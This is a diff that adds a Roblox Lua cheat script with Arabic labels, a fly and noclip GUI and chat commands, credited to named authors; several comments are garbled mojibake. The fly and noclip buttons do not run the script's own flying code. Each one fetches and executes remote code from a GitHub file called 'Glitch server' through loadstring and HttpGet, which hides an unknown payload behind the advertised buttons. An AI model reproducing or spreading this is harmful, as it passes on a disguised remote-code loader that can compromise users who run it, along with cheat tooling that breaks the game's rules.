@@ -1,0 +1,264 @@
+--// Alawi Activation Notification
+
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+
+local notificationSound = Instance.new("Sound")
+notificationSound.SoundId = "rbxassetid://9086208751"
+notificationSound.Volume = 1
+notificationSound.Parent = SoundService
+
+task.spawn(function()
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "تم تعديله من قبل علاوي",
+            Text = "تم تفعيل سكربت",
+            Icon = "rbxassetid://7938753161",
+            Duration = 4
+        })
+    end)
+
+    notificationSound:Play()
+end)
+local plr = game:GetService("Players").LocalPlayer
+local run = game:GetService("RunService")
+local cam = workspace.CurrentCamera
+local coreGui = game:GetService("CoreGui")
+local starterGui = game:GetService("StarterGui")
+
+-- Variables
+local noclipActive = false 
+local clipEnabled = true   
+local speed = 0.5 
+local pos, gyro, heartbeatEvent
+
+-- Visual Enhanced Notification
+local function notify(title, msg)
+    pcall(function()
+        starterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = "\n" .. msg .. "\n ", 
+            Duration = 5,
+            Button1 = "Ok"
+        })
+    end)
+end
+
+-------------------------------------------------------
+-- UI Construction (English Version with î€€)
+-------------------------------------------------------
+
+if coreGui:FindFirstChild("GameDontBannedUI") then
+    coreGui.GameDontBannedUI:Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GameDontBannedUI"
+screenGui.Parent = coreGui
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.15, 0, 0.22, 0) 
+frame.Position = UDim2.new(0.1, 0, 0.2, 0)
+frame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+frame.Active = true
+frame.Draggable = true 
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0.05, 0)
+corner.Parent = frame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+titleLabel.Text = "طيران ادمن معدل ب عربي" 
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextScaled = true
+titleLabel.Parent = frame
+Instance.new("UICorner", titleLabel).CornerRadius = UDim.new(0.2, 0)
+
+local speedInput = Instance.new("TextBox")
+speedInput.Size = UDim2.new(0.8, 0, 0.15, 0)
+speedInput.Position = UDim2.new(0.1, 0, 0.25, 0)
+speedInput.Text = tostring(speed)
+speedInput.PlaceholderText = "اكتب سرعه..."
+speedInput.TextScaled = true
+speedInput.Parent = frame
+Instance.new("UICorner", speedInput)
+
+local flyBtn = Instance.new("TextButton")
+flyBtn.Size = UDim2.new(0.8, 0, 0.2, 0)
+flyBtn.Position = UDim2.new(0.1, 0, 0.45, 0)
+flyBtn.Text = "ايقاف طيران"
+flyBtn.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+flyBtn.TextColor3 = Color3.new(1, 1, 1)
+flyBtn.TextScaled = true
+flyBtn.Parent = frame
+Instance.new("UICorner", flyBtn)
+
+local noclipBtn = Instance.new("TextButton")
+noclipBtn.Size = UDim2.new(0.8, 0, 0.2, 0)
+noclipBtn.Position = UDim2.new(0.1, 0, 0.7, 0)
+noclipBtn.Text = "اختراق جدارن ايقاف"
+noclipBtn.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+noclipBtn.TextColor3 = Color3.new(1, 1, 1)
+noclipBtn.TextScaled = true
+noclipBtn.Parent = frame
+Instance.new("UICorner", noclipBtn)
+
+-------------------------------------------------------
+-- Core Logic Functions
+-------------------------------------------------------
+
+local function resetCharacterCollision(char)
+    if not char then return end
+    for _, o in ipairs(char:GetDescendants()) do
+        if o:IsA("BasePart") then
+            local name = o.Name:lower()
+            if name:find("torso") or name:find("root") or name:find("head") then
+                o.CanCollide = true
+            else
+                o.CanCollide = false
+            end
+        end
+    end
+end
+
+-- ه¢‍ه¼؛ç‰ˆهپœو­¢é£‍è،Œه‡½و•°
+local function stopFly()
+    noclipActive = false
+    if heartbeatEvent then 
+        heartbeatEvent:Disconnect() 
+        heartbeatEvent = nil
+    end
+    if pos then pos:Destroy() pos = nil end
+    if gyro then gyro:Destroy() gyro = nil end
+    
+    local char = plr.Character
+    if char then
+        local humanoid = char:FindFirstChildOfClass("Humanoid")
+        if humanoid then 
+            humanoid.PlatformStand = false 
+            -- ه¼؛هˆ¶و”¹هڈکçٹ¶و€پن»¥éک²é”پو­»هœ¨ Ragdoll
+            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+        end
+        resetCharacterCollision(char)
+    end
+end
+
+local function setNoclipState(state)
+    clipEnabled = not state
+    noclipBtn.Text = state and "اختراق جدارن ايقاف" or "اختراق جدارن تشغيل"
+    noclipBtn.BackgroundColor3 = state and Color3.fromRGB(50, 150, 50) or Color3.fromRGB(80, 80, 80)
+    if not state and plr.Character then
+        resetCharacterCollision(plr.Character)
+    end
+end
+
+local function setFlyState(state)
+    -- ه¦‚و‍œوک¯ه…³é—­و“چن½œï¼Œç«‹هچ³و‰§è،Œ stopه¹¶è·³ه‡؛
+    if not state then
+        flyBtn.Text = "تشغيل طيران"
+        flyBtn.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+        stopFly()
+        return
+    end
+
+    noclipActive = true
+    flyBtn.Text = "ايقاف طيران"
+    flyBtn.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+
+    local char = plr.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+    if not root or not humanoid then return end
+
+    pos = Instance.new("BodyPosition")
+    gyro = Instance.new("BodyGyro")
+    pos.Position = root.Position + Vector3.new(0, 3, 0)
+    pos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    pos.P, pos.D = 40000, 1700  
+    gyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+    gyro.P, gyro.D = 40000, 1900
+    pos.Parent = root
+    gyro.Parent = root
+    
+    humanoid.PlatformStand = true
+    
+    humanoid.Died:Connect(function()
+        setFlyState(false)
+    end)
+
+    heartbeatEvent = run.Heartbeat:Connect(function()
+        -- ه†چو¬،و£€وں¥و ‡è®°ï¼Œç،®ن؟‌ن¸چن¼ڑهœ¨ه…³é—­هگژè؟گè،Œ
+        if not noclipActive then return end
+        
+        local moveDir = humanoid.MoveDirection
+        local cf = cam.CFrame
+        local travelVector = moveDir * (speed * 5)
+        local dir = cf:VectorToObjectSpace(travelVector)
+        
+        if dir.Magnitude > 0 then
+            local worldDir = cf:VectorToWorldSpace(Vector3.new(dir.X, 0, dir.Z).Unit * dir.Magnitude)
+            pos.Position = pos.Position + worldDir
+        end
+        gyro.CFrame = cf
+        
+        if not clipEnabled then
+            for _, o in ipairs(char:GetDescendants()) do
+                if o:IsA("BasePart") then o.CanCollide = false end
+            end
+        else
+            resetCharacterCollision(char)
+        end
+        humanoid.PlatformStand = true
+    end)
+end
+
+-------------------------------------------------------
+-- Input Bindings & Commands
+-------------------------------------------------------
+
+flyBtn.MouseButton1Click:Connect(function() 
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/aliazayduazaydu-cpu/Idk/refs/heads/main/Glitch%20server"))()
+end)
+
+noclipBtn.MouseButton1Click:Connect(function() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/aliazayduazaydu-cpu/Idk/refs/heads/main/Glitch%20server"))()
+end)
+
+plr.Chatted:Connect(function(msg)
+    local args = string.split(string.lower(msg), " ")
+    local cmd = args[1]
+    
+    if cmd == "؛طيران" then
+        if args[2] and tonumber(args[2]) then
+            speed = tonumber(args[2])
+            speedInput.Text = tostring(speed)
+        end
+        if not noclipActive then setFlyState(true) end
+    elseif cmd == "؛عدم" then
+        if noclipActive then setFlyState(false) end
+    elseif cmd == "؛اختراق" then
+        setNoclipState(true)
+    elseif cmd == "؛ايقاف" or cmd == ";unnoclip" then
+        setNoclipState(false)
+    end
+end)
+
+speedInput.FocusLost:Connect(function()
+    local num = tonumber(speedInput.Text)
+    if num then speed = num speedInput.Text = tostring(speed) end
+end)
+
+plr.CharacterRemoving:Connect(function() 
+    stopFly() 
+end)
+
+-------------------------------------------------------
+-- Final Credits Notification
+-------------------------------------------------------
+notify("CREDITSî€€", "MADE BY UNNAMED (NPC_PlayersNoob)\n\nTHANKS FOR USING!")
